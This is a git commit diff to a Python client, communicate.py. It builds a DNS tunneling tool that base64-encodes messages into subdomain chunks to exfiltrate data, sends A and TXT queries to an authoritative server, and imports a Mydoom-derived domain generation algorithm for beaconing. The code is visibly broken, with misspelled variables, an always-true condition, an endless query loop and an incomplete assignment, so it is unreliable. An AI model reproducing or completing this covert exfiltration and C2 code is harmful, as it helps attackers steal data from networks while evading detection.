84f0baa14db9ad3b072d07f1b5751a2e0e5adce4
Rets66 <asce_salut666chere@icloud.com>
2019-05-27 15:29:58 +0900

    Moadify exfiltrate and query parts

--- client/communicate.py
+++ client/communicate.py
@@ -5,39 +5,66 @@ import base64
 from sys import argv
 
 import dns.resolver
+from dga import mydoom
 
+# communication.py
+# <Fucntions>
+##  - can check the number of the response packet
+##  - can select both and Specific domain DGA domain
+##  - can select the type of decode
+##  - can define the interval
+##  - can embed the message or predifine characters as beacon frame into subdomain
+# <Scenario>
+## 1. decide the target hostname
+##   - dga or specific domain
+## 2. check the size of message in teh TXT record
+## 3. request the TXT record
+# <Mapping of subdomain>
+## - 'mail' : the size of RR
+## - 'www'  : the required packet numbers
 
-SUBDOMAIN={1:'www', 0:'mail'}
+def search_response(msg:str)->str:
+    pass
 
-
-def query(qname: str) -> list:
-    response = dns.resolver.query(qname, 'TXT')
-    verification_line = [str(i).split('=') for i in response[:]\
-                        if 'verification' in str(i)]
-    return verificaion_line
-
-def create_qname(message: str, length: int=10) -> list:
-
-    cipher = base64.b64encode(message.encode()).decode()
-    return [cipher[i: i+length] for i in range(0, len(cipher), length)]
-
-
-def request(subdomain: list) -> list:
-
-    """ 
-    - Query the contents of TXT record
-    - Handle the value if the value's line is multi
+def exfiltrate(msg: str, length: int=10) -> list:
     """
+    - control the number of packets based of the response packet size
+    - if the requested message packet, 
+    """
+    # if you decode the message, put on '=' in the end after comine the line
+    encrypted = base64.b64encode(msg.encode()).decode().strip('=')
+    decomposed_msg = [_encrypted[i: i+lentgh] for i in range(0, len(_encrypted), length)]
+    return decompose_msg
 
-    for _ in subdomain:
-        value = []
-        domain = "{0}.{1}".format(_, DOMAIN)
-        response = list(dns.resolver.query(domain, 'TXT'))
+def query(message: list, hostname: str, RR: str) -> list:
+    """
+    - deal with the number of requesting messages
+    - send the query message to the auth server
+    - handle RR based on the query message
+    """
+    # Query the DNS request to the auth server
+    if len(message) == 1:
+        payload = [message + '.' + hostname]
+        if message == 'mail' or 'www':
+            RR = 'A'
+            while True:
+                dns.resolver.query(payload, RR)
+            return 0
 
-        pass
-        answer.append(res)
+        else:
+            RR = 'TXT'
+            response = dns.resolver.query(payload, RR)
+            verification_line = [str(i).split('=') for i in response[:]\
+                                if 'verification' in str(i)]
+            return verification_line
 
-    return answer
+    else:
+        payload = [msg + '.' + hostname for msg in message]
+        RR = 'A'
+        for i in payload:
+            dns.resolver.query(payload, RR)
+        return 0
+
 
 def decipher(answer: list) -> str:
 
@@ -54,35 +81,37 @@ def decipher(answer: list) -> str:
     pass
 
 def main(qname: str) -> str:
-
-    query = create_query(qname)
     answer = request(query)
     print(answer)
 
 
 if __name__ == '__main__':
-
     parser = argparse.ArgumentParser(
-                    usage='communicate.py [-h] [-s(specific) | -r(random)]'\
-                          '[-d(decode_type) |-i(interval)]',\
+                    usage='communicate.py [-h] [-s(specify) <hostname>|-d(DGA)]'\
+                          '[-t(decode_type) <base*>] [-i(interval {s}) <60>]',\
                     description='Get the value of domain verification')
-    parser.add_argument('-s', '--specific', help='specific domain', \
+    parser.add_argument('-s', '--specify', help='specify the target host', \
                         action='store_true')
-    parser.add_argument('-r', '--random', help='use randomly generated domain', \
+    parser.add_argument('-d', '--dga', help='use domain genelation algrorithm', \
                         action='store_true')
-    parser.add_argument('-d', '--decode_type', help='difine the type of decode', \
+    parser.add_argument('-t', '--decode_type', help='difine the type of decode', \
                         action='store_true')
     parser.add_argument('-i', '--interval', help='difine the interval time of \
                         request packet', action='store_true')
+    parser.add_argument('-c', '--', help='define the messages into subdomain',\
+                        action='store_true')
+
 
     args = parser.parse_args()
-    if args.specific:
+    if args.specify:
         domain = args.domain
         # call function
-    if args.random:
-        # call randomly generate query
+    if args.dga:
+        # call DGA function
         pass
     if args.decode_type:
         decode = args.decode_type
     if args.interval:
         interval = args.interval
+    if args.message:
+         = args.message
